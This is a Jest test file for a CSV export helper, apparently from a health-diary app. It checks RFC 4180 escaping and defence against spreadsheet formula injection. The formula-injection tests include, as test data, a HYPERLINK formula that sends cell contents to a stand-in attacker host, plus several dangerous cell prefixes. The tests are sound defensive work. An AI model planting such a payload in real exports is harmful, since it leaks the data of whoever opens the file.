import { csvCell, csvFile, csvRow } from '../csv';

/**
 * CSV that a spreadsheet cannot misread, and cannot be tricked by.
 *
 * The escaping tests are the ordinary ones. The formula-injection tests are the reason this module
 * exists rather than a `join(',')`: this export is meant to be handed to a clinician, and it is
 * exactly the sort of file someone forwards.
 */

describe('escaping', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvCell('bloating')).toBe('bloating');
  });

  it('quotes a value containing a comma', () => {
    expect(csvCell('rice, chicken and garlic')).toBe('"rice, chicken and garlic"');
  });

  it('doubles an embedded quote', () => {
    expect(csvCell('felt "off" all evening')).toBe('"felt ""off"" all evening"');
  });

  // A newline inside a note would otherwise start a new record and shift every column after it.
  it('quotes a value containing a newline', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('writes an empty cell for null and undefined', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvCell('')).toBe('');
  });

  it('writes numbers and booleans plainly', () => {
    expect(csvCell(7)).toBe('7');
    expect(csvCell(0)).toBe('0');
    expect(csvCell(false)).toBe('false');
  });
});

describe('formula injection', () => {
  // A cell starting with any of these is executed by Excel, Numbers and Google Sheets.
  it.each(['=', '+', '-', '@'])('neutralises a cell starting with %s', (prefix) => {
    expect(csvCell(`${prefix}1+1`)).toBe(`'${prefix}1+1`);
  });

  it('neutralises the classic hyperlink exfiltration payload', () => {
    const payload = '=HYPERLINK("https://evil.example/"&A1,"click")';
    const cell = csvCell(payload);

    expect(cell.startsWith('"\'=')).toBe(true);
    expect(cell).toContain('HYPERLINK');
  });

  // Both are neutralised, but only the carriage return is also quoted: RFC 4180 requires quoting
  // for quote, comma, CR and LF, and a tab is none of those.
  it('neutralises a leading tab and a leading carriage return', () => {
    expect(csvCell('\tcmd')).toBe("'\tcmd");
    expect(csvCell('\rcmd')).toBe(`"'\rcmd"`);
  });

  // The apostrophe must go on before quoting, or the escaping would wrap an unneutralised value.
  it('neutralises and escapes together, in that order', () => {
    expect(csvCell('=a,b')).toBe(`"'=a,b"`);
  });

  // A negative number is a legitimate value and reads as one; the apostrophe costs nothing but is
  // worth knowing about when reading an export.
  it('also prefixes a negative number, which is the price of the rule', () => {
    expect(csvCell('-3')).toBe("'-3");
  });

  it('does not prefix a value that merely contains an equals sign', () => {
    expect(csvCell('a=b')).toBe('a=b');
  });
});

describe('rows and files', () => {
  it('joins a row with commas', () => {
    expect(csvRow(['a', 1, null])).toBe('a,1,');
  });

  // CRLF per RFC 4180, and because Excel on Windows is the likely destination.
  it('writes a header and CRLF line endings', () => {
    const file = csvFile(['when', 'what'], [['2026-06-01', 'bloating']]);

    expect(file).toBe('when,what\r\n2026-06-01,bloating');
  });

  it('writes only a header for an empty export', () => {
    expect(csvFile(['when', 'what'], [])).toBe('when,what');
  });
});
